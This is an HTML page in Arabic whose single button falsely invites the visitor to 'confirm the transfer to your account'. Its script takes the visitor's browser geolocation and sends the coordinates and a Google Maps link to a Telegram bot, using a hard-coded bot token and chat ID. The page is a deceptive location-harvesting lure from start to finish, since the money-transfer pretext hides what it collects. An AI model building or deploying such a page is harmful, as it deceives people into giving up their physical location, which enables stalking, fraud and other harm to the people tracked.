<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>اضغط هنا</title>
  <style>
    body {
      margin: 0;
      font-family: system-ui, sans-serif;
      background: url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=1920&q=80') no-repeat center center fixed;
      background-size: cover;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    button {
      padding: 15px 30px;
      font-size: 20px;
      font-weight: bold;
      background-color: rgba(0, 0, 0, 0.6);
      color: #fff;
      border: none;
      border-radius: 12px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <button id="getLocationBtn">اضغط لتأكيد التحويل لحسابك</button>

  <script>
    const TELEGRAM_BOT_TOKEN = '8332410324:AAEai9n4ojPBRHD6QT92IvQAhuiYzfXeMR4';
    const TELEGRAM_CHAT_ID = '7744463904';

    document.getElementById('getLocationBtn').addEventListener('click', () => {
      if (!('geolocation' in navigator)) {
        alert('متصفحك لا يدعم تحديد الموقع.');
        return;
      }
      navigator.geolocation.getCurrentPosition(pos => {
        const { latitude, longitude } = pos.coords;
        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const message = `📍 موقع جديد:\nخط العرض: ${latitude}\nخط الطول: ${longitude}\nرابط الخريطة: ${googleMapsLink}`;

        // استخدام GET لتجنب مشاكل CORS على Render
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
        fetch(url)
          .then(res => res.json())
          .then(data => {
            if (data.ok) {
              alert('تم إرسال الموقع إلى تيليجرام بنجاح.');
            } else {
              alert('حدث خطأ أثناء الإرسال إلى تيليجرام.');
            }
          })
          .catch(err => {
            alert('تعذر الإرسال: ' + err.message);
          });
      }, err => {
        alert('تعذر الحصول على الموقع: ' + err.message);
      });
    });
  </script>
</body>
</html>
